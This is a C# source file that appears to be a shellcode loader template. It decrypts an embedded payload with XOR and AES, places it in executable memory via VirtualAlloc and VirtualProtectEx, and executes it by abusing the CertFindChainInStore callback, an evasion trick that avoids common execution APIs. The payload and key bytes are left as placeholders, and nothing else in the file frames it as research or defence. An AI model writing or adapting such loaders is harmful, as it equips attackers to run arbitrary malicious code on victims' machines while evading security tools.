using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace CertFindChainInStore
{
    internal class Program
    {
        private static byte[] XorEncDec(byte[] input, byte[] theKey)
        {
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                int length = i % theKey.Length;
                mixed[i] = (byte)(input[i] ^ theKey[length]);
            }
            return mixed;
        }

        private static byte[] AESDecrypt(byte[] cipherData, byte[] aes_key, byte[] aes_iv)
        {
            MemoryStream ms = new MemoryStream();
            Rijndael alg = Rijndael.Create();
            alg.Key = aes_key;
            alg.IV = aes_iv;
            CryptoStream cs = new CryptoStream(ms, alg.CreateDecryptor(), CryptoStreamMode.Write);
            cs.Write(cipherData, 0, cipherData.Length);
            cs.Close();
            byte[] decryptedData = ms.ToArray();
            return decryptedData;
        }

        static void Main(string[] args)
        {
            byte[] encryptedShellcode = { ENCRYPTED_SHELL_CODE_BYTES };
            byte[] XorKey = { XOR_KEY_BYTES };
            byte[] AesKey = { AES_KEY_BYTES };
            byte[] AesIv = { AES_IV_BYTES };
            byte[] payload = new byte[] { };
            byte[] aesEncrypted = XorEncDec(encryptedShellcode, XorKey);
            payload = AESDecrypt(aesEncrypted, AesKey, AesIv);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            IntPtr hCertStore = CertOpenSystemStore(0, "MY");

            CERT_CHAIN_FIND_BY_ISSUER_PARA sCCFIP = new CERT_CHAIN_FIND_BY_ISSUER_PARA();
            sCCFIP.pfnFindCallback = hAlloc;
            sCCFIP.cbSize = (uint)Marshal.SizeOf(sCCFIP);

            CertFindChainInStore(
                hCertStore,
                0x1,
                0,
                1,
                ref sCCFIP,
                IntPtr.Zero);

            //Cleanup
            CertCloseStore(hCertStore, 0);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("crypt32.dll", CharSet = CharSet.Unicode)]
        public static extern IntPtr CertOpenSystemStore(
            uint hProv,
            String szSubsystemProtocol
            );

        [DllImport("crypt32.dll", SetLastError = true)]
        public static extern IntPtr CertFindChainInStore(
            IntPtr hCertStore,
            uint dwCertEncodingType,
            uint dwFindFlags,
            uint dwFindType,
            ref CERT_CHAIN_FIND_BY_ISSUER_PARA pvFindPara,
            IntPtr pPrevChainContext);

        [DllImport("crypt32.dll", SetLastError = true)]
        public static extern bool CertCloseStore(IntPtr storeProvider, int flags);

        public struct CERT_CHAIN_FIND_BY_ISSUER_PARA
        {
            public uint cbSize;
            public string pszUsageIdentifier;
            public uint dwKeySpec;
            public uint dwAcquirePrivateKeyFlags;
            public uint cIssuer;
            public IntPtr rgIssuer;
            public IntPtr pfnFindCallback;
            public IntPtr pvFindArg;
            public uint dwIssuerChainIndex;
            public uint dwIssuerElementIndex;
        }
    }
}
